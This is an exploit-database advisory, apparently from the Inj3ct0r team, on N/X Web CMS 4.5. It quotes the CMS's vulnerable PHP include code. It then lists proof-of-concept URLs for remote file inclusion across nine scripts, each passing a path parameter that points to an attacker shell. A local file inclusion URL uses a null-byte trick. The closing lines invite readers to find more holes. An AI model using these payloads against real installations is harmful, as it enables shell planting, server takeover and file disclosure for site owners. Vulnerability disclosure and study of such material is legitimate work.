@@ -1,0 +1,221 @@
+N/X - Web CMS (N/X WCMS 4.5) Multiple Vulnerability
+===================================================
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : Inj3ct0r.com                                  0
+1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
+0                                                                      0
+1                    ########################################          1
+0                    I'm eidelweiss member from Inj3ct0r Team          1
+1                    ########################################          0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+Work If:	magic_quotes_gpc & magic_quotes_runtime Disable
+Download:	http://sourceforge.net/projects/nxwcms/files/0.%20N_X%20WCMS%204.5%20System/4.5%20Release%201/nx45.zip/download
+
+Author:		eidelweiss
+Contact:	eidelweiss[at]cyberservices.com
+Thank`s:	r0073r & 0x1D (inj3ct0r) , JosS , exploit-db team , [D]eal [C]yber
+		sp3x (securityreason) get-well brother
+Special To:	m4rc0 & LeQhi  (thank`s so much brother , respect to you)
+
+Advisories:	http://eidelweiss-advisories.blogspot.com/2010/04/nx-web-cms-nx-wcms-45-multiple.html
+
+========================================================================
+
+Description:
+
+N/X 4.0 is a powerful content management system for the web.
+N/X CMS is focused on delivering content in many powerful ways.
+Its functions and content-types can be extended with the plugin-interface and a very very powerful API. 
+
+========================================================================
+
+	-=[ VULN C0de ]=-
+
+**************************************************
+[-] nx_path/www/text.php
+**************************************************
+
+<?PHP
+  require_once "nxheader.inc.php";
+  include $cds->path."inc/header.php";
+
+  // Start of individual template
+  echo $cds->content->get("Headline");
+  br();
+  echo $cds->content->get("Body");  
+  
+ 
+  include $cds->path."inc/footer.php";
+  require_once "nxfooter.inc.php";
+?>
+
+**************************************************
+[-] nx_path/www/article.php
+**************************************************
+
+<?PHP
+  require_once "nxheader.inc.php";
+  require_once $cds->path."inc/header.php";
+
+  // get the id of the article from the request
+  // do type validation
+  
+  echo $cds->cluster->draw($article);
+  br();
+  br();
+    
+  // link back to the page where the article was called    
+  echo $cds->content->get("Backlink Title");
+  
+  require_once $cds->path."inc/footer.php";
+  require_once "nxfooter.inc.php";
+?>
+
+**************************************************
+[-] nx_path/www/article_overview.php
+**************************************************
+<?PHP
+  require_once "nxheader.inc.php";
+  require_once $cds->path."inc/header.php";	// line 3
+
+	*****
+
+  require_once $cds->path."inc/footer.php";	// line 42
+  require_once "nxfooter.inc.php";
+?>
+
+**************************************************
+[-] nx_path/www/sitemap.php
+**************************************************
+
+<?PHP
+  require_once "nxheader.inc.php";
+  include $cds->path."inc/header.php";	// line 3
+
+	*****
+
+  include $cds->path."inc/footer.php";		// line 56
+  require_once "nxfooter.inc.php";
+?>
+
+**************************************************
+[-] nx_path/www/pagelayout.inc.php
+**************************************************
+
+**************************************************
+[-] nx_path/www/nxheader.inc.php
+**************************************************
+
+<?php
+	/*
+	 * Include this file in your page-templates
+	 */
+	 if (isset($c["path"])) {
+	 	require_once $c["path"]."config.inc.php";
+	 } else {
+	   require_once "../cms/config.inc.php";
+	 }
+	 include_once $c["path"]."api/cds/track_exit_pages.php";
+	 require_once $c["path"]."api/cds/lib.inc.php";
+
+	*****
+
+	 if ($c["pagetracking"]  && ! $c["usewebbug"]) {
+	    include_once $c["path"].'modules/stats/phpOpenTracker.php';	// line 31
+	    @phpOpenTracker::log(array('document' => $page));	
+	 }
+	 require_once $c["path"]."ext/jpcache/jpcache.php";	// line 34
+
+**************************************************
+[-] nx_path/cms/api/xml/lib.inc.php
+**************************************************
+<?
+	require_once $c["path"] . "api/xml/xpath.class.php";
+   require_once $c["path"] . "api/xml/meta.php";
+   require_once $c["path"] . "api/xml/plugin.php";
+   require_once $c["path"] . "api/xml/cluster_template.php";
+   require_once $c["path"] . "api/xml/cluster.php";   
+   require_once $c["path"] . "api/xml/sitepage_master.php"; 
+   require_once $c["path"] . "api/xml/syndication.php"; 
+   require_once $c["path"] . "api/xml/xmlapi_prepare.php";
+?>
+
+**************************************************
+[-] nx_path/cms/api/parser/lib.inc.php
+**************************************************
+<?
+	require_once $c["path"] . "api/parser/nxparser.php";
+	require_once $c["path"] . "api/parser/class.filemanipulation.php";
+	require_once $c["path"] . "api/parser/class.mso2003.php";
+	require_once $c["path"] . "api/parser/class.openoffice.php";
+	require_once $c["path"] . "api/parser/nx2html.php";
+	require_once $c["path"] . "api/parser/html2nx.php";
+	require_once $c["path"] . "api/parser/launch_text.php";
+	require_once $c["path"] . "api/parser/importhtml.php";
+	require_once $c["path"] . "api/parser/importtext.php";
+?>
+
+**************************************************
+[-] nx_path/cms/api/cms/lib.inc.php
+**************************************************
+<?
+	require_once $c["path"] . "api/cms/cache.php";
+    require_once $c["path"] . "api/cms/journal.php";
+	require_once $c["path"] . "api/cms/launch.php";
+	require_once $c["path"] . "api/cms/mass_operations.php";
+	require_once $c["path"] . "api/cms/oiddictionary.php";
+	require_once $c["path"] . "api/cms/paths.php";
+	require_once $c["path"] . "api/cms/plugin.php";
+	require_once $c["path"] . "api/cms/image.php";
+	require_once $c["path"] . "api/cms/sitepages.php";
+	require_once $c["path"] . "api/cms/sitepage_master.php";
+	require_once $c["path"] . "api/cms/synchronize.php";
+	require_once $c["path"] . "api/cms/cdsinformation.php";
+	require_once $c["path"] . "api/cms/acl/lib.inc.php";
+	require_once $c["path"] . "api/cms/log.php";
+    require_once $c["path"] . "api/cms/meta.php";
+    require_once $c["path"] . "api/cms/cluster_template.php";
+    require_once $c["path"] . "api/cms/cluster.php";
+    require_once $c["path"] . "api/cms/channel.php";
+    require_once $c["path"] . "api/cms/design.class.php";
+    require_once $c["path"] . "api/cms/designclasses.php"
+?>
+========================================================================
+
+	-=[ P0C RFI ]=-
+
+	http://127.0.0.1/[NX_PATH]/www/text.php?path= [inj3ct0r sh3ll]
+	http://127.0.0.1/[NX_PATH]/www/article.php?path= [inj3ct0r sh3ll]
+	http://127.0.0.1/[NX_PATH]/www/article_overview.php?path= [inj3ct0r sh3ll]
+	http://127.0.0.1/[NX_PATH]/www/sitemap.php?path= [inj3ct0r sh3ll]
+	http://127.0.0.1/[NX_PATH]/www/pagelayout.inc.php?c[path]= [inj3ct0r sh3ll]
+	http://127.0.0.1/[NX_PATH]/www/nxheader.inc.php?c[path]= [inj3ct0r sh3ll]
+	http://127.0.0.1/[NX_PATH]/cms/api/xml/lib.inc.php?c[path]= [inj3ct0r sh3ll]
+	http://127.0.0.1/[NX_PATH]/cms/api/parser/lib.inc.php?c[path]= [inj3ct0r sh3ll]
+	http://127.0.0.1/[NX_PATH]/cms/api/cms/lib.inc.php?c[path]= [inj3ct0r sh3ll]
+
+	etc , etc ,etc
+
+
+	-=[ P0C LFI ]=-
+
+	http://127.0.0.1/[NX_PATH]/www/nxheader.inc.php?page= [LFI]%00
+
+	etc , etc , etc,
+
+[*] So many vulnerability here , use your skill and play your imagination [*]
+[*] vuln in  NX_path/wwwdev Directory i thing same with vuln in NX_path/www that`s why i don`t put here [*]
+
+=========================| -=[ E0F ]=- |=================================
